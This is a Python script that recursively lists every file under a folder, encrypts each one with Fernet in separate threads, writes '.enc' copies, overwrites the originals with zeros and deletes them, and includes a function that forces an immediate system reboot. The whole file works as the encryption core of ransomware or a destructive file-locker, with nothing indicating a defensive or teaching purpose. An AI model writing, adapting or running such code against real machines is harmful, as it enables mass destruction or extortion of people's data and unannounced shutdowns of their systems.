# Import :
import os, threading
from cryptography.fernet import Fernet


class generate_thread(threading.Thread):
    # This class generate the threads
    def __init__(self, thread_id, key, file):
        """
        Initialise the class
        :param threadID -- Give you the thead ID:
        :param key -- key to encrypt the files:
        :param file -- This variable contains the path plus name of the file to encrypt:
        """
        # The heritage from the mother class "Thread" is mandatory
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.key = key
        self.file = file

    def run(self):
        """
        This function is called when we want to create a new thread
        -> Start() function of the mother class "Thread"
        """
        # Functions call
        encryption_function(self.key, self.file)
        overwrite_file(self.file)


def list_files(path):
    """
    List files in a folder and its subfolders
    :param path -- path to the folder:
    :return -- return a files list:
    """
    # List containing the files
    files_list = []

    # Loop to retrieve the paths and filenames
    for current_directory, sub_directories, files in os.walk(path):
        for file in files:
            full_path_filename = (os.path.join(path + os.path.relpath(current_directory, path), file))
            files_list.append(full_path_filename)

    # Return a files list
    return files_list


def encryption_function(key, non_encrypt_file):
    """
    encrypt function
    :param key -- key to encrypt:
    :param non_encrypt_file -- file to encrypt:
    """
    # Variables
    # Cipher generation
    cipher_suite = Fernet(key)
    filename, file_extension = os.path.splitext(non_encrypt_file)
    # Extension padding (8 bits are dedicated for the extension)
    file_extension += ' ' * (8 - (len(file_extension) % 8))

    with open(non_encrypt_file, 'rb') as file_handler:
        # Reading the file
        chunk_read = file_handler.read()
        # Encrypting file contents
        cipher_text = cipher_suite.encrypt(chunk_read)

        # Creating the encrypted file
        with open(filename + ".enc", 'wb') as file_encrypt:
            # Writing the original extension
            file_encrypt.write(file_extension.encode())
            # Writing the encrypted content
            file_encrypt.write(cipher_text)


def decryption_function(key, encrypt_file):
    """
    Decryption function
    :param key -- decryption key:
    :param encrypt_file -- file to decrypt:
    """
    # Cipher generation
    cipher_suite = Fernet(key)
    # Separate filename and its extension
    filename_no_extension, _ = os.path.splitext(encrypt_file)

    with open(filename_no_extension + '.enc', 'rb') as encrypt_filename:
        # Reading the extension from the encrypt file
        file_extension = encrypt_filename.read(8).decode().replace(" ", "")

        # Reading the encrypt content
        cipher_text = encrypt_filename.read()

        # Call the decrypt function
        plain_text = cipher_suite.decrypt(cipher_text)
        # Writing encrypted content in a new file
        with open(filename_no_extension + file_extension, 'wb') as decrypt_file:
            decrypt_file.write(plain_text)

    # Remove the encrypt file
    os.remove(encrypt_file)


def overwrite_file(filename):
    """
    Overwrite a file with zeros
    :param filename -- file to fill with zeros:
    """

    # Get statistic information about the file
    stat = os.stat(filename)

    with open(filename, 'r+') as of:
        # Fill the file with zero based on its size
        of.write('\0' * stat.st_size)
        # Flush the file buffer fromm memory
        of.flush()
    # Remove the file from the HDD
    os.remove(filename)


# Until, I find a true way to remove the key from memory
# I have to reboot it
def reboot_machine():
    """
    Force the machine to reboot
    Remove the encryption key from memory
    """
    os.system("shutdown -t 0 -r -f")